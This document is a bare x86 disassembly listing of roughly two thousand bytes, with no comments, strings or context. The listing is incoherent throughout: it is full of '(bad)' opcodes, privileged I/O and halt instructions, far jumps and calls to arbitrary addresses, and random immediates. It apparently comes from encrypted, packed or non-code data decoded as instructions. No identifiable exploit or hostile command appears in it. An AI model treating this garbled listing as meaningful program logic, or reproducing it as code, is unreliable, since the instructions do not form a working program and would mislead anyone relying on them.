  414d4f:	mov    DWORD PTR [edi-0x1e4cebea],0xdad680d4
  414d59:	(bad)  
  414d5a:	fsubr  DWORD PTR ds:0x9b4975d7
  414d60:	and    BYTE PTR [eax+edx*1+0x54],dl
  414d64:	add    ebp,eax
  414d66:	mov    ds:0x9406687e,al
  414d6b:	loop   0x414ddd
  414d6d:	repz cs xor eax,0xa9eeb881
  414d74:	nop
  414d75:	fcmove st,st(7)
  414d77:	hlt    
  414d78:	jns    0x414d60
  414d7a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  414d7b:	inc    edx
  414d7c:	jle    0x414d33
  414d7e:	mov    ch,0x1f
  414d80:	push   es
  414d81:	lods   eax,DWORD PTR ds:[esi]
  414d82:	fbstp  TBYTE PTR [ecx+0x1415a789]
  414d88:	pop    esi
  414d89:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  414d8a:	jle    0x414d90
  414d8c:	(bad)  
  414d8d:	mov    ecx,0xabccbdc7
  414d92:	mov    ds:0x6d8fb9e7,al
  414d97:	push   0x70
  414d99:	frstor gs:[esi+0xf]
  414d9d:	loop   0x414e0b
  414d9f:	dec    ebp
  414da0:	(bad)  
  414da1:	aad    0x3e
  414da3:	jmp    0x383f:0xd572ca4b
  414daa:	xlat   BYTE PTR ds:[ebx]
  414dab:	je     0x414d84
  414dad:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  414dae:	out    0x19,eax
  414db0:	jecxz  0x414de1
  414db2:	xor    BYTE PTR [edi-0x26ad414b],dl
  414db8:	and    dl,BYTE PTR [edi+0x7d]
  414dbb:	repz (bad) 
  414dbd:	or     BYTE PTR cs:[eax+0x59],bl
  414dc1:	push   0x80323a6b
  414dc6:	jns    0x414d68
  414dc8:	pop    ecx
  414dc9:	adc    eax,0x34c74392
  414dce:	lea    ebx,[ebp+eiz*2-0x3]
  414dd2:	add    al,BYTE PTR [edi+0x22]
  414dd5:	pusha  
  414dd6:	into   
  414dd7:	pop    ebp
  414dd8:	aam    0xb2
  414dda:	sub    ecx,edi
  414ddc:	mov    dl,0xc9
  414dde:	xlat   BYTE PTR ds:[ebx]
  414ddf:	ds std 
  414de1:	js     0x414d6f
  414de3:	popa   
  414de4:	aam    0x64
  414de6:	int    0xc8
  414de8:	pop    ds
  414de9:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  414dea:	loopne 0x414e08
  414dec:	jl     0x414dfe
  414dee:	or     BYTE PTR [ebp-0x10fa957f],dh
  414df4:	xor    ah,BYTE PTR [esi-0x1b]
  414df7:	or     eax,esp
  414df9:	inc    esi
  414dfa:	xchg   DWORD PTR [ebp-0x6defffc9],edi
  414e00:	das    
  414e01:	xor    BYTE PTR [edx+0x14be59a0],0x85
  414e08:	lea    edi,[edi+0x3a4038a1]
  414e0e:	bound  edx,QWORD PTR [ecx-0xb]
  414e11:	cmp    eax,0xdbf07f71
  414e16:	push   edi
  414e17:	loopne 0x414dc1
  414e19:	aaa    
  414e1a:	bound  edi,QWORD PTR [eax]
  414e1c:	mov    ebp,0xdd89fe31
  414e21:	into   
  414e22:	push   ds
  414e23:	and    BYTE PTR [ebx+0x18],dl
  414e26:	popf   
  414e27:	pop    ecx
  414e28:	mov    al,ds:0xb0e022de
  414e2d:	sbb    ecx,ebx
  414e2f:	sbb    al,BYTE PTR [ebp+0x3ad697d7]
  414e35:	popf   
  414e36:	ret    
  414e37:	jb     0x414ea4
  414e39:	jns    0x414e4d
  414e3b:	sbb    al,0x6f
  414e3d:	lds    ebx,FWORD PTR [ebx-0x3e37930b]
  414e43:	jno    0x414e4d
  414e45:	cs out 0xd2,al
  414e48:	mov    ebp,0x318e8be9
  414e4d:	pop    ds
  414e4e:	shl    al,1
  414e50:	mov    edi,0x28201528
  414e55:	xchg   edx,eax
  414e56:	jg     0x414e09
  414e58:	(bad)  
  414e59:	hlt    
  414e5a:	pop    ebx
  414e5b:	dec    esp
  414e5c:	jg     0x414e4c
  414e5e:	or     bh,BYTE PTR [ebp+0x38]
  414e61:	adc    eax,0x56600279
  414e66:	cmp    ebp,0xfffffff1
  414e69:	mov    ch,0x3
  414e6b:	jb     0x414eb7
  414e6d:	shr    DWORD PTR [edi+0x22012f4e],0x6b
  414e74:	mov    ds:0x496ceaf9,al
  414e79:	int    0xea
  414e7b:	add    DWORD PTR [esi+eiz*8-0xb],edx
  414e7f:	dec    esi
  414e80:	push   ds
  414e81:	mov    dh,0x3c
  414e83:	(bad)  
  414e84:	pushf  
  414e85:	stos   DWORD PTR es:[edi],eax
  414e86:	(bad)  
  414e87:	hlt    
  414e88:	cmc    
  414e89:	sbb    ecx,DWORD PTR [ebp+0x3d]
  414e8c:	repnz (bad) 
  414e8e:	mov    esi,0xd2593806
  414e93:	jmp    0x414ed1
  414e95:	add    edx,ebx
  414e97:	stos   DWORD PTR es:[edi],eax
  414e98:	cwde   
  414e99:	pop    ebp
  414e9a:	and    eax,DWORD PTR ds:0x28762ca5
  414ea0:	add    ebp,DWORD PTR [esi]
  414ea2:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  414ea3:	loope  0x414e2f
  414ea5:	jbe    0x414ef5
  414ea7:	mov    bh,0x75
  414ea9:	mov    ebx,0x9f460ea8
  414eae:	xor    bl,0x4c
  414eb1:	mov    BYTE PTR [edx+0x7e],dl
  414eb4:	ins    BYTE PTR es:[edi],dx
  414eb5:	jnp    0x414e45
  414eb7:	ret    
  414eb8:	bound  eax,QWORD PTR [edi+ecx*4-0x1315d074]
  414ebf:	outs   dx,BYTE PTR ds:[esi]
  414ec0:	ss pop ebp
  414ec2:	jnp    0x414f34
  414ec4:	mov    ds:0xb2ba7b90,eax
  414ec9:	push   ebx
  414eca:	add    ch,al
  414ecc:	sbb    edx,DWORD PTR [ebx-0x3d]
  414ecf:	imul   BYTE PTR [eax+esi*4+0x655168ad]
  414ed6:	pushf  
  414ed7:	mov    ds:0x31af08f0,eax
  414edc:	imul   ebp,DWORD PTR [edi],0x167cea9e
  414ee2:	jmp    0x8021:0x87715993
  414ee9:	imul   eax,DWORD PTR [ecx-0x88f82fc],0xffffffe0
  414ef0:	add    al,0x9b
  414ef2:	sbb    bh,BYTE PTR [eax]
  414ef4:	mov    bl,0xa3
  414ef6:	lods   eax,DWORD PTR ds:[esi]
  414ef7:	jae    0x414ee4
  414ef9:	adc    edi,DWORD PTR [edx+0x27bf16c0]
  414eff:	test   BYTE PTR [eax-0x22],cl
  414f02:	scas   al,BYTE PTR es:[edi]
  414f03:	adc    BYTE PTR [ebp-0x50a33717],0xea
  414f0a:	add    eax,0x3a307100
  414f0f:	adc    eax,0xc6731bf9
  414f14:	mov    dl,BYTE PTR [edi-0x78]
  414f17:	addr16 dec edx
  414f19:	rcl    esp,cl
  414f1b:	jecxz  0x414ef2
  414f1d:	mov    edx,0x201e921c
  414f22:	cmp    eax,0x944bc986
  414f27:	(bad)  
  414f29:	sbb    DWORD PTR [esi-0x49a2ee64],0xd047db8a
  414f33:	dec    eax
  414f34:	mov    dh,0xfb
  414f36:	push   edi
  414f37:	and    DWORD PTR [esi],edx
  414f39:	in     eax,0x84
  414f3b:	in     eax,dx
  414f3c:	dec    edx
  414f3d:	jne    0x414f79
  414f3f:	enter  0x7229,0x77
  414f43:	fst    st(5)
  414f45:	xor    DWORD PTR [ebp-0x25],eax
  414f48:	or     edx,DWORD PTR [ecx+0x6c]
  414f4b:	mov    dh,0x4f
  414f4d:	adc    DWORD PTR [ebx-0x6b],ebp
  414f50:	fist   DWORD PTR [ebp+0x2b]
  414f53:	mov    ah,0x92
  414f55:	lahf   
  414f56:	outs   dx,BYTE PTR ds:[esi]
  414f57:	and    eax,0xcc9c764a
  414f5c:	and    DWORD PTR [ebp-0x19e7ac75],eax
  414f62:	stc    
  414f63:	mov    eax,0xfb6d70b1
  414f68:	ret    0x8662
  414f6b:	fs jecxz 0x414fe6
  414f6e:	popa   
  414f6f:	mov    eax,ds:0x14fb083f
  414f74:	popf   
  414f75:	dec    ebx
  414f76:	dec    esi
  414f77:	nop
  414f78:	sbb    al,BYTE PTR ds:0x1375c98b
  414f7e:	cmc    
  414f7f:	cld    
  414f80:	cmp    eax,0xa6bbc2bb
  414f85:	ins    BYTE PTR es:[edi],dx
  414f86:	into   
  414f87:	loop   0x414fbb
  414f89:	mov    bl,0xcc
  414f8b:	(bad)  [edi-0x48fe637f]
  414f91:	jmp    0x414fce
  414f93:	sbb    bl,BYTE PTR [esi-0x1e3a05df]
  414f99:	out    dx,eax
  414f9a:	rol    DWORD PTR [esi-0x62],0xab
  414f9e:	das    
  414f9f:	add    esp,DWORD PTR [esi-0x1a]
  414fa2:	mov    cs,WORD PTR [edx]
  414fa4:	xchg   ebx,eax
  414fa5:	aaa    
  414fa6:	dec    edx
  414fa7:	dec    esi
  414fa8:	shl    DWORD PTR [edi+0xf],cl
  414fab:	(bad)  
  414fac:	pop    ds
  414fad:	xchg   ebp,eax
  414fae:	add    eax,0x15386837
  414fb3:	jge    0x414fef
  414fb5:	add    al,0x42
  414fb7:	jno    0x414f55
  414fb9:	cmp    eax,DWORD PTR [edx+0x18]
  414fbc:	xchg   esp,eax
  414fbd:	jne    0x414f90
  414fbf:	and    eax,0x4538d478
  414fc4:	arpl   ax,ax
  414fc6:	pushf  
  414fc7:	inc    edx
  414fc8:	dec    eax
  414fc9:	sub    al,0x21
  414fcb:	jge    0x414f6d
  414fcd:	xor    al,0x1b
  414fcf:	pushf  
  414fd0:	cwde   
  414fd1:	aad    0x4c
  414fd3:	jns    0x414fb1
  414fd5:	mov    dh,0x9e
  414fd7:	add    DWORD PTR [ebx+edx*4+0x6da42fd],edx
  414fde:	int    0x33
  414fe0:	(bad)  
  414fe1:	popa   
  414fe2:	xor    al,BYTE PTR [edx]
  414fe4:	rol    BYTE PTR [edi],cl
  414fe6:	adc    al,0xae
  414fe8:	clc    
  414fe9:	out    dx,al
  414fea:	and    DWORD PTR [esi-0x57],esp
  414fed:	cli    
  414fee:	xchg   ecx,eax
  414fef:	xor    DWORD PTR [esi+edi*4+0x7551ea44],esp
  414ff6:	sbb    esp,DWORD PTR [di]
  414ff9:	ja     0x414fd6
  414ffb:	int3   
  414ffc:	ins    DWORD PTR es:[edi],dx
  414ffd:	mov    ebx,0x392a4792
  415002:	gs sub eax,0xc1eafc6e
  415008:	or     ah,ah
  41500a:	mov    dh,0x7a
  41500c:	shl    DWORD PTR [esi-0x34],1
  41500f:	inc    ecx
  415010:	sahf   
  415011:	inc    esi
  415012:	push   edi
  415013:	or     DWORD PTR gs:[ecx-0x3e5edf95],edi
  41501a:	loope  0x41500e
  41501c:	cld    
  41501d:	mov    ds,WORD PTR [ebp-0x36]
  415020:	scas   eax,DWORD PTR es:[edi]
  415021:	dec    ebx
  415022:	mov    eax,ds:0xce58c700
  415027:	clc    
  415028:	push   ss
  415029:	xchg   esi,eax
  41502a:	and    al,0x95
  41502c:	xchg   edx,eax
  41502d:	sub    DWORD PTR [ebx+0x7b7d796],0xd6f7a730
  415037:	fnsave [eax]
  415039:	imul   ebx,DWORD PTR [ebp-0x2917bb88],0x1f
  415040:	pop    esi
  415041:	mov    bh,0xfe
  415043:	leave  
  415044:	shl    BYTE PTR [ebx],0x87
  415047:	sbb    BYTE PTR [ecx],dl
  415049:	adc    eax,0x74f52f2d
  41504e:	xor    DWORD PTR [edi-0x4874feac],edx
  415054:	pop    edi
  415055:	mov    WORD PTR [esi],es
  415057:	jae    0x415055
  415059:	add    BYTE PTR [esi-0x4],bh
  41505c:	mov    edx,0x31ea8827
  415061:	addr16 loopne 0x4150a3
  415064:	dec    edi
  415065:	test   DWORD PTR [ebp+esi*8+0x651d301d],ecx
  41506c:	fcmovb st,st(6)
  41506e:	cdq    
  41506f:	call   0xf91d7977
  415074:	std    
  415075:	data16 out dx,al
  415077:	ret    
  415078:	push   ds
  415079:	jmp    0x4150f1
  41507b:	jp     0x415031
  41507d:	add    DWORD PTR [ebx+ebx*1],eax
  415080:	ds mov ah,0xfa
  415083:	imul   ebx,DWORD PTR [eax],0xfffffffe
  415086:	sub    dl,BYTE PTR [eax+0x25e786c0]
  41508c:	push   ecx
  41508d:	int    0x85
  41508f:	fs jle 0x41509c
  415092:	mov    dh,0x65
  415094:	out    dx,al
  415095:	mov    dh,0x47
  415097:	loope  0x415024
  415099:	stos   BYTE PTR es:[edi],al
  41509a:	sar    DWORD PTR [ecx+ebp*8+0x4d87659b],1
  4150a1:	pop    ecx
  4150a2:	xchg   esi,eax
  4150a3:	xchg   ecx,eax
  4150a4:	add    al,0x3a
  4150a6:	add    BYTE PTR [ebx+ebx*4+0x2],0xec
  4150ab:	cmp    bl,cl
  4150ad:	aad    0xf2
  4150af:	pop    eax
  4150b0:	sbb    ecx,ebp
  4150b2:	dec    ebx
  4150b3:	push   edx
  4150b4:	in     eax,0xac
  4150b6:	sub    BYTE PTR [ebx],dh
  4150b8:	addr16 cs mov ebp,0xac5e47cf
  4150bf:	test   DWORD PTR [edi*8-0x379228a7],ebx
  4150c6:	(bad)  
  4150c7:	fwait
  4150c8:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4150c9:	lods   eax,DWORD PTR ds:[esi]
  4150ca:	pop    ebx
  4150cb:	test   eax,0x5d2171d1
  4150d0:	adc    DWORD PTR [ebx],ebx
  4150d2:	arpl   WORD PTR [esp+eax*8-0x2e273c00],sp
  4150d9:	imul   DWORD PTR [ebp+0xb]
  4150dc:	outs   dx,BYTE PTR ds:[esi]
  4150dd:	mov    al,0x2d
  4150df:	add    eax,0xfa9b777e
  4150e4:	stc    
  4150e5:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4150e6:	add    esp,ecx
  4150e8:	or     eax,0xa6cd4989
  4150ed:	out    0xdf,eax
  4150ef:	imul   edx,ebp,0xdc13eb1
  4150f5:	(bad)  
  4150f6:	sub    BYTE PTR [ebp+0x5b],ch
  4150f9:	adc    eax,0x799388cc
  4150fe:	shl    BYTE PTR [eax+0x12],1
  415101:	ja     0x415135
  415103:	dec    esi
  415104:	mov    edi,0x17396ec8
  415109:	sar    cl,1
  41510b:	sti    
  41510c:	cmp    bl,bl
  41510e:	cmp    DWORD PTR [eax+0x4ecdc86d],edx
  415114:	into   
  415115:	add    al,dh
  415117:	mov    esp,0xb8d3a2d6
  41511c:	dec    esp
  41511d:	pop    ebx
  41511e:	aas    
  41511f:	pop    ecx
  415120:	into   
  415121:	cmp    al,0x60
  415123:	sub    al,0x6e
  415125:	xchg   esi,eax
  415126:	lods   eax,DWORD PTR ds:[esi]
  415127:	cmp    DWORD PTR [eax-0x6e94d31f],ebp
  41512d:	aam    0x2e
  41512f:	mov    al,ds:0x1d0d2aa2
  415134:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  415135:	xor    BYTE PTR [esi-0x45684edb],dl
  41513b:	nop
  41513c:	jl     0x4150c7
  41513e:	scas   eax,DWORD PTR es:[edi]
  41513f:	jmp    0xdaaaf081
  415144:	push   edi
  415145:	xor    DWORD PTR [ebx+eiz*8-0x3f17feff],edi
  41514c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41514d:	mov    ch,0xf1
  41514f:	(bad)  
  415151:	fdiv   QWORD PTR [edx-0x2f]
  415154:	mov    cl,0x6e
  415156:	jb     0x415136
  415158:	xlat   BYTE PTR ds:[ebx]
  415159:	or     cl,al
  41515b:	(bad)  
  41515c:	(bad)  
  41515d:	xor    eax,0x843c59fb
  415162:	push   es
  415163:	fst    DWORD PTR [edx-0xad118bb]
  415169:	push   es
  41516a:	loopne 0x41517d
  41516c:	or     edi,DWORD PTR [esi-0x5771271f]
  415172:	sub    edx,DWORD PTR [ebx+0x22]
  415175:	sbb    al,0x82
  415177:	vprotb xmm4,xmm3,gs:[edi-0x37]
  41517e:	xor    eax,0x927fcbc5
  415183:	pusha  
  415184:	push   cs
  415185:	or     bh,bl
  415187:	test   esp,edi
  415189:	sbb    DWORD PTR [ebx-0x2576f501],edi
  41518f:	xor    ah,dl
  415191:	pushf  
  415192:	call   0x1fa62588
  415197:	stos   BYTE PTR es:[edi],al
  415198:	aad    0x3a
  41519a:	test   al,0x8e
  41519c:	jmp    FWORD PTR gs:[ebx+ebp*8-0x5b]
  4151a1:	(bad)  
  4151a2:	sti    
  4151a3:	sbb    eax,0x90f721fa
  4151a8:	call   0xf729dde8
  4151ad:	icebp  
  4151ae:	les    ecx,FWORD PTR [edx+0x2498ed8b]
  4151b4:	(bad)  
  4151b5:	(bad)  
  4151b6:	sbb    ch,dl
  4151b8:	icebp  
  4151b9:	sub    BYTE PTR [ebp+edi*4+0x20be9d42],al
  4151c0:	jmp    0x69e6ff64
  4151c5:	add    ch,BYTE PTR [ebx-0x36]
  4151c8:	repnz and eax,0x9f3eb9f
  4151ce:	dec    eax
  4151cf:	dec    eax
  4151d0:	push   ds
  4151d1:	mov    esi,0x88c2aa10
  4151d6:	in     eax,dx
  4151d7:	lea    ecx,[edx+0x72]
  4151da:	adc    cl,0x8a
  4151dd:	pop    edx
  4151de:	sub    DWORD PTR [ebx-0x29],0xe30539d1
  4151e5:	repz std 
  4151e7:	or     al,0xb0
  4151e9:	ins    BYTE PTR es:[edi],dx
  4151ea:	xor    DWORD PTR [esi+eax*4-0x79],ebx
  4151ee:	fwait
  4151ef:	lahf   
  4151f0:	pop    ecx
  4151f1:	cmp    esi,DWORD PTR [ebp+0x34]
  4151f4:	call   0xd4b2:0xeb2a6abb
  4151fb:	lahf   
  4151fc:	add    esp,ebx
  4151fe:	xor    DWORD PTR [ebx+ebx*4],edi
  415201:	mov    ah,0xd6
  415203:	mov    al,0xe4
  415205:	jo     0x4151d2
  415207:	mov    ds:0x7a3b9b05,al
  41520c:	lds    edi,FWORD PTR [ebx]
  41520e:	iret   
  41520f:	dec    ecx
  415210:	loop   0x4151a8
  415212:	and    eax,0x76f9fe75
  415217:	push   esi
  415218:	es inc edx
  41521a:	mov    bl,0xcd
  41521c:	dec    esp
  41521d:	jb     0x4151e0
  41521f:	dec    ebx
  415220:	jmp    0xcda2:0x4848bac
  415227:	sub    eax,0x5e24e563
  41522c:	inc    esp
  41522d:	pop    esp
  41522e:	std    
  41522f:	xchg   esi,eax
  415230:	inc    ecx
  415231:	call   0xa3d8:0x49eb6d36
  415238:	xchg   edx,eax
  415239:	stos   BYTE PTR es:[edi],al
  41523a:	cmp    dl,BYTE PTR [edx]
  41523c:	push   ecx
  41523d:	hlt    
  41523e:	lods   eax,DWORD PTR ds:[esi]
  41523f:	jmp    0x41523c
  415241:	neg    BYTE PTR [edi+0x40b4673]
  415247:	jge    0x4152a8
  415249:	and    DWORD PTR [ebx],esp
  41524b:	push   esp
  41524c:	mov    edx,DWORD PTR [edi-0x78]
  41524f:	cmp    DWORD PTR [esi],ecx
  415251:	xlat   BYTE PTR ds:[ebx]
  415252:	mov    al,ds:0xe0285615
  415257:	dec    ecx
  415258:	cmp    ecx,DWORD PTR [ecx]
  41525a:	sub    al,0xd6
  41525c:	xchg   edx,eax
  41525d:	add    BYTE PTR [ebx],0xc3
  415260:	ret    0x3a15
  415263:	pop    esp
  415264:	push   ecx
  415265:	lock xchg esi,eax
  415267:	adc    ebx,0x4b76f6f3
  41526d:	sbb    ah,bl
  41526f:	sbb    eax,ecx
  415271:	sub    dh,BYTE PTR ds:0xe9f8ae6a
  415277:	sbb    bl,BYTE PTR [ebx-0x13]
  41527a:	dec    ebp
  41527b:	sbb    al,bh
  41527d:	cmp    DWORD PTR [edx+esi*8-0x31021135],eax
  415284:	loop   0x4152e9
  415286:	mov    ebx,0x361d6b23
  41528b:	loope  0x4152e9
  41528d:	ins    DWORD PTR es:[edi],dx
  41528e:	xchg   DWORD PTR [ebp+0x207a7056],ebx
  415294:	xchg   DWORD PTR [esi],edi
  415296:	clc    
  415297:	sbb    al,0x21
  415299:	fistp  DWORD PTR [ebx-0x52]
  41529c:	scas   al,BYTE PTR es:[edi]
  41529d:	stos   BYTE PTR es:[edi],al
  41529e:	sub    al,0x71
  4152a0:	sub    bl,BYTE PTR [ecx+0xb]
  4152a3:	pop    eax
  4152a4:	ror    DWORD PTR [ebx-0x80],1
  4152a7:	repnz xchg edi,eax
  4152a9:	pop    esi
  4152aa:	cmp    BYTE PTR fs:[ebx],ch
  4152ad:	dec    ebp
  4152ae:	mov    dh,0x74
  4152b0:	xchg   edi,eax
  4152b1:	leave  
  4152b2:	jmp    0xc06a31d8
  4152b7:	pop    eax
  4152b8:	push   0x35
  4152ba:	mov    dh,0xdc
  4152bc:	mov    al,0x36
  4152be:	push   es
  4152bf:	clc    
  4152c0:	add    BYTE PTR [ebx],dh
  4152c2:	mov    ch,ah
  4152c4:	cld    
  4152c5:	int3   
  4152c6:	out    0x36,al
  4152c8:	jb     0x4152fd
  4152ca:	loop   0x41533b
  4152cc:	sub    DWORD PTR [eax-0x28],0x93ef7ab8
  4152d3:	mov    edi,0x949fa2c9
  4152d8:	adc    BYTE PTR [ebp+0x46],ah
  4152db:	sar    cl,cl
  4152dd:	and    al,BYTE PTR [eax-0x1c]
  4152e0:	mov    edx,0x9149f550
  4152e5:	js     0x4152e2
  4152e7:	out    0x5,al
  4152e9:	fisub  DWORD PTR [edi+0x77915f7d]
  4152ef:	popa   
  4152f0:	mov    ebp,0x7f22f8fe
  4152f5:	mov    ch,0x58
  4152f7:	sar    ch,0x2d
  4152fa:	(bad)  
  4152fb:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4152fc:	sbb    DWORD PTR [ebx-0x77],esi
  4152ff:	ds jns 0x4152c6
  415302:	(bad)  [eax]
  415304:	pop    ebp
  415305:	(bad)  
  415306:	push   ebx
  415307:	jg     0x415362
  415309:	cdq    
  41530a:	xor    DWORD PTR [bx+0x52c7],edx
  41530f:	pop    esp
  415310:	mov    cs,WORD PTR [edi+ebx*4+0x7c3204f3]
  415317:	cmp    ecx,edx
  415319:	popa   
  41531a:	(bad)  
  41531b:	(bad)  
  41531c:	xchg   DWORD PTR [ecx+0x4591f1b0],ebx
  415322:	in     al,dx
  415323:	adc    edi,edi
  415325:	mov    BYTE PTR [edi+0x26],bl
  415328:	repz cmc 
  41532a:	cdq    
  41532b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41532c:	ds mov edi,0xf4f9ee9b
  415332:	lea    ecx,[edx+0x6cb8c03a]
  415338:	ret    
  415339:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41533a:	add    esi,DWORD PTR [eax+0x4f]
  41533d:	das    
  41533e:	or     DWORD PTR [esi],eax
  415340:	xchg   esp,eax
  415341:	test   BYTE PTR [ebx],ch
  415343:	(bad)  
  415344:	dec    ebp
  415345:	push   ecx
  415346:	mov    al,ds:0xcceca42f
  41534b:	out    dx,al
  41534c:	idiv   DWORD PTR [edx-0x3bfc9969]
  415352:	jae    0x415377
  415354:	ins    BYTE PTR es:[edi],dx
  415355:	sbb    bl,ch
  415357:	(bad)  
  415358:	sahf   
  415359:	push   0x4eb6f3ed
  41535e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41535f:	cmc    
  415360:	adc    al,0x80
  415362:	xor    BYTE PTR ds:0x1ecd911f,ah
  415368:	and    al,0x6
  41536a:	shl    BYTE PTR [ebp+ebp*4+0x1e],cl
  41536e:	inc    edx
  41536f:	lahf   
  415370:	add    eax,0x11386ff
  415375:	lahf   
  415376:	call   0x4eb40334
  41537b:	or     al,0x22
  41537d:	pusha  
  41537e:	sub    cl,BYTE PTR [edx]
  415380:	mov    eax,ds:0x73e087f1
  415385:	cmp    ebx,DWORD PTR [ebp-0x6804e908]
  41538b:	mov    eax,ds:0x7306203d
  415390:	inc    ebp
  415391:	pop    edi
  415392:	xor    eax,0xefd7d9da
  415397:	nop
  415398:	ror    DWORD PTR [ecx+0x31],cl
  41539b:	test   DWORD PTR [edx+0x4d8d0728],ebp
  4153a1:	push   0xa3d8a19
  4153a6:	call   0x898757e7
  4153ab:	cmc    
  4153ac:	sbb    BYTE PTR [ebx+0x61],dl
  4153af:	push   ebp
  4153b0:	jae    0x41533c
  4153b2:	mov    esi,0x2fcb2029
  4153b7:	pop    eax
  4153b8:	jo     0x415340
  4153ba:	sbb    eax,0x76dbf022
  4153bf:	inc    edi
  4153c0:	fidivr WORD PTR ss:[ebp-0xf8a8af0]
  4153c7:	jecxz  0x415361
  4153c9:	or     eax,0x44070c3c
  4153ce:	xchg   ecx,eax
  4153cf:	and    dh,BYTE PTR [edi+0x36]
  4153d2:	frstor [ebx-0x39402b29]
  4153d8:	(bad)  
  4153d9:	mov    al,0x27
  4153db:	jl     0x415401
  4153dd:	pop    edx
  4153de:	aaa    
  4153df:	out    0x70,eax
  4153e1:	push   ss
  4153e2:	xchg   esp,eax
  4153e3:	je     0x415383
  4153e5:	push   esp
  4153e6:	inc    edi
  4153e7:	push   edx
  4153e8:	in     al,0xca
  4153ea:	mov    eax,ds:0x24498269
  4153ef:	adc    ecx,eax
  4153f1:	dec    edi
  4153f2:	jbe    0x4153a6
  4153f4:	jge    0x4153d5
  4153f6:	sub    al,0x70
  4153f8:	sub    edx,ecx
  4153fa:	(bad)  [esi-0x29b8b765]
  415400:	sub    al,BYTE PTR [ecx-0x19]
  415403:	lods   al,BYTE PTR ds:[esi]
  415404:	in     al,0x5c
  415406:	xchg   esi,eax
  415407:	imul   esp,esi,0x5d
  41540a:	ret    0x7217
  41540d:	mov    ah,0x16
  41540f:	ds cdq 
  415411:	mov    al,0xfa
  415413:	mov    eax,0xce4ca8b5
  415418:	cmp    al,0x53
  41541a:	out    0x3d,al
  41541c:	pop    ss
  41541d:	jno    0x415434
  41541f:	loopne 0x415433
  415421:	push   ebp
  415422:	sub    esp,DWORD PTR [eax+0x76ac53c0]
  415428:	dec    ebx
  415429:	test   BYTE PTR [ebx],bh
  41542b:	fmul   QWORD PTR [eax+0x7b9d39a0]
  415431:	xchg   edi,eax
  415432:	es aad 0x0
  415435:	aas    
  415436:	outs   dx,DWORD PTR ds:[esi]
  415437:	xchg   DWORD PTR [eax],ebp
  415439:	in     al,dx
  41543a:	mov    bl,0x9b
  41543c:	sub    BYTE PTR [ebx+0x4744ff84],bh
  415442:	or     ch,BYTE PTR [esi+0x4888c0b6]
  415448:	jno    0x4153d8
  41544a:	mov    WORD PTR [eax+0x47a7bb43],gs
  415450:	repnz push 0xefff41c9
  415456:	xchg   esi,eax
  415457:	nop
  415458:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  415459:	rol    BYTE PTR [ecx],cl
  41545b:	add    BYTE PTR [ebx*8-0x77d8fb3f],ah
  415462:	nop
  415463:	adc    edi,DWORD PTR ds:0xf651f08
  415469:	clc    
  41546a:	mov    dh,0x5a
  41546c:	repnz imul ebp,ebx,0xffffffa5
  415470:	xchg   ebp,eax
  415471:	stos   BYTE PTR es:[edi],al
  415472:	gs dec esp
  415474:	xor    DWORD PTR [edx+ebx*2-0x4902c4a6],edx
  41547b:	mov    dl,0xf7
  41547d:	in     al,0xfb
  41547f:	leave  
  415480:	sub    eax,0xd10110cb
  415485:	rcr    BYTE PTR [eax],cl
  415487:	jnp    0x41545f
  415489:	sub    al,0xbf
  41548b:	and    al,0xc6
  41548d:	imul   ah
  41548f:	rol    BYTE PTR [ebx],0x80
  415492:	or     bl,BYTE PTR [ecx]
  415494:	and    BYTE PTR [edi+esi*8+0x4f9863ca],al
  41549b:	out    0x39,eax
  41549d:	or     ah,BYTE PTR gs:[edi-0x21]
  4154a1:	xor    eax,esp
  4154a3:	enter  0x16b0,0xa7
  4154a7:	in     al,0xc1
  4154a9:	rcl    BYTE PTR [ebx-0x66],0x7b
  4154ad:	shr    BYTE PTR [edi+0x74eb34a],1
  4154b3:	stos   DWORD PTR es:[edi],eax
  4154b4:	(bad)  
  4154b5:	or     al,0x2f
  4154b7:	mov    edx,0xa3b77268
  4154bc:	and    al,0x80
  4154be:	dec    esp
  4154bf:	mov    BYTE PTR [edx+0x69043a2],ch
  4154c5:	cwde   
  4154c6:	adc    DWORD PTR [eax-0x22],edx
  4154c9:	sbb    DWORD PTR [edi+0x6c],esi
  4154cc:	and    ah,BYTE PTR [esi+0x17]
  4154cf:	imul   edi,edi,0xc8010dd9
  4154d5:	sbb    al,0x8
  4154d7:	xchg   ebx,eax
  4154d8:	inc    eax
  4154d9:	add    ebx,DWORD PTR [ebx+edx*1-0xc35f490]
  4154e0:	mov    eax,0x8e819e17
  4154e5:	fwait
  4154e6:	pusha  
  4154e7:	je     0x41551f
  4154e9:	sbb    esp,DWORD PTR [edi+0x3459b8ac]
  4154ef:	jne    0x415559
  4154f1:	les    esi,FWORD PTR [edi-0xd]
  4154f4:	pop    ebx
  4154f5:	mov    dl,0x15
  4154f7:	xlat   BYTE PTR ds:[ebx]
  4154f8:	mov    eax,ds:0xb8540ded
  4154fd:	cs call 0xf0c383b7
  415503:	es jbe 0x4154d0
  415506:	jno    0x415503
  415508:	mov    ds:0x92895ac0,eax
  41550d:	call   0x517a:0xf908e868
  415514:	push   edx
  415515:	rol    esp,cl
  415517:	push   ds
  415518:	xchg   esp,eax
  415519:	adc    bh,al
  41551b:	out    0x6,al
  41551d:	pop    esp
  41551e:	jge    0x41557f
  415520:	pushf  
  415521:	mov    dl,0x8
  415523:	xor    ah,ch
  415525:	sub    al,0xc7
  415527:	xor    al,BYTE PTR [ecx]
  415529:	jg     0x41557b
  41552b:	xchg   ebp,eax
  41552c:	fcomp  QWORD PTR [edi+0x14aad237]
  415532:	or     DWORD PTR [esi+0x76d2075c],edi
  415538:	add    ah,BYTE PTR ds:0xa67bbd86
  41553e:	adc    BYTE PTR [edx+eax*8],0x18
  415542:	pop    ds
  415543:	fwait
